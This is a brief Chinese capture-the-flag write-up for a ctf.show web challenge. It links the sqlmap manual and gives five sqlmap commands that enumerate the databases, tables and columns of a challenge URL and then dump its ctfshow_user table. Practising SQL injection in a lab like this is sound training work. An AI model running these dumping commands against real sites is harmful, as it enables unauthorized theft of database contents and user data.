# 知识点
### sqlmap
使用手册<br />[https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
# 思路
```bash
python sqlmap.py -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show
```
```bash
python sqlmap.py -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show --dbs
```
```bash
python sqlmap.py -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web --tables
```
```bash
python sqlmap.py -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --columns
```
```bash
python sqlmap.py -u http://75d6ef49-ed52-4bc1-bb21-5320fc6d1485.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump 
```
